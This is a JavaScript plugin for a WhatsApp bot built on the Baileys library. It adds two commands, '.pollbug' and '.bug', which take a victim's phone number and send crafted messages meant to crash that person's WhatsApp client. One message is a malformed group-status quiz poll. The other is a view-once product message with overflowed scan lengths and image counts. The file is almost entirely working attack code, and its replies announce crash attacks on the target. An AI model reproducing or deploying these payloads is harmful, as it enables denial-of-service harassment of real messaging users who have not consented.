const { cmd } = require('../command');
const crypto = require('crypto');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys'); // use your Baileys version if different

// ---------- POLL CRASH COMMAND ----------
cmd({
    pattern: "pollbug",
    desc: "Send poll crash message to target",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    try {
        // Check if target number was provided
        if (!args[0]) {
            return reply(`❌ *ERROR: Missing target number!*\n\nUsage:\n.pollbug 947XXXXXXXXX\n\nExample: .pollbug 94712345678`);
        }

        // Format target number
        const target = args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';

        await reply(`🔥 *POLL CRASH ATTACK INITIATED* 🔥\n\nTarget: ${target}\nMethod: Poll Crash\nStatus: Processing...`);

        await xlmnop(conn, target);

        await reply(`✅ *POLL CRASH ATTACK COMPLETED* ✅\n\nTarget: ${target}\nStatus: Success!`);
    } catch (error) {
        console.error(error);
        reply(`❌ Error: ${error.message}`);
    }
});

// ---------- VIEW-ONCE CRASH COMMAND ----------
cmd({
    pattern: "bug",
    desc: "Send image/viewOnce crash message to target",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    try {
        // Check if target number was provided
        if (!args[0]) {
            return reply(`❌ *ERROR: Missing target number!*\n\nUsage:\n.bug 947XXXXXXXXX\n\nExample: .bug 94712345678`);
        }

        // Format target number
        const target = args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';

        await reply(`🔥 *VIEWONCE CRASH ATTACK INITIATED* 🔥\n\nTarget: ${target}\nMethod: ViewOnce Crash\nStatus: Processing...`);

        await ttaas(conn, target);

        await reply(`✅ *VIEWONCE CRASH ATTACK COMPLETED* ✅\n\nTarget: ${target}\nStatus: Success!`);
    } catch (error) {
        console.error(error);
        reply(`❌ Error: ${error.message}`);
    }
});

// ---------- POLL CRASH FUNCTION ----------
async function xlmnop(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    messageAssociation: {
                        parentMessageKey: { id: "larp-larp-larp-sahur" }
                    }
                },
                pollCreationMessage: {
                    name: "There's no limit to larp",
                    options: [
                        { optionName: "gugugaga" },
                        { optionName: "zaza" }
                    ],
                    selectableOptionsCount: 1,
                    pollType: "QUIZ",
                    correctAnswer: { optionName: "zaza" },
                    contextInfo: { isGroupStatus: true }
                }
            }
        }
    }, {});

    await conn.relayMessage(target, msg.message, {});
}

// ---------- VIEW-ONCE CRASH FUNCTION ----------
async function ttaas(conn, target) {
    const imageMessage = {
        "url": "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        "mimetype": "image/jpeg",
        "fileSha256": "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        "fileLength": "93217",
        "caption": "7eppsynC",
        "height": 1080,
        "width": 1080,
        "mediaKey": "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        "fileEncSha256": "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        "directPath": "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        "mediaKeyTimestamp": "1778142659",
        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        "contextInfo": {
            "pairedMediaType": "NOT_PAIRED_MEDIA",
            "isQuestion": true,
            "isGroupStatus": true
        },
        "scansSidecar": "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        "firstScanLength": 9999999999999999999,
        "scanLengths": [
            9999999999999999999,
            9999999999999999999,
            9999999999999999999,
            9999999999999999999
        ],
        "midQualityFileSha256": "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "7eppsynC",
                        description: "",
                        priceAmount1000: {
                            low: 999,
                            high: 0,
                            unsigned: false,
                        },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: {
                            low: 9999999,
                            high: 999999999,
                            unsigned: true,
                        },
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net",
                }
            }
        }
    }, {});

    await conn.relayMessage(target, msg.message, {});
}
